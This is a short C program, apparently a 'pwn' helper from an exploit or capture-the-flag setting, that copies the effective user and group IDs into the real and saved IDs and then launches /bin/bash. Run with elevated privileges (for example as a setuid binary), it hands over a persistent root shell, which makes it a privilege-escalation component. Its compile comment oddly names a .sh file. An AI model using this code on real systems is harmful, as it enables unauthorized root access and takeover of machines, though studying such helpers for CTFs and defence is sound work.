/*
gcc pwn.sh -o pwn
*/

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
    setresgid(getegid(), getegid(), getegid());
    setresuid(geteuid(), geteuid(), geteuid());

    execve("/bin/bash", argv,  envp);
    return 0;
}
